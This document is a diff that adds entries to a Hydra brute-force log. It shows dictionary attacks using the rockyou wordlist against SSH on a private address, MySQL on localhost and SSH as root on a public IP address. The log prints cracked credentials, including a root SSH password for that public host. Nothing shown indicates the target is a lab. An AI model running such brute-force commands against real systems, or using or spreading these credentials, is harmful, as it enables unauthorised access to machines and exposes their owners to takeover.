@@ -5,3 +5,6 @@
 # Hydra v9.5 run at 2023-07-05 09:22:06 on 192.168.1.13 ssh (hydra -l zero -P rockyou.txt -t 64 -vV -o output.log -I ssh://192.168.1.13)
 # Hydra v9.5 run at 2023-07-05 17:08:15 on localhost mysql (hydra -l root -P rockyou.txt -t 64 -vV -o output.log -I mysql://localhost)
 [3306][mysql] host: localhost   login: root   password: CMonster2006!@#!@#!@#
+# Hydra v9.5 run at 2023-07-05 18:46:14 on 74.207.232.103 ssh (hydra -l root -P rockyou.txt -t 64 -vV -o output.log -I ssh://74.207.232.103)
+# Hydra v9.5 run at 2023-07-05 18:47:11 on 74.207.232.103 ssh (hydra -l root -P rockyou.txt -t 64 -vV -o output.log -I ssh://74.207.232.103)
+[22][ssh] host: 74.207.232.103   login: root   password: kejre6-biXcik-wyjhyk
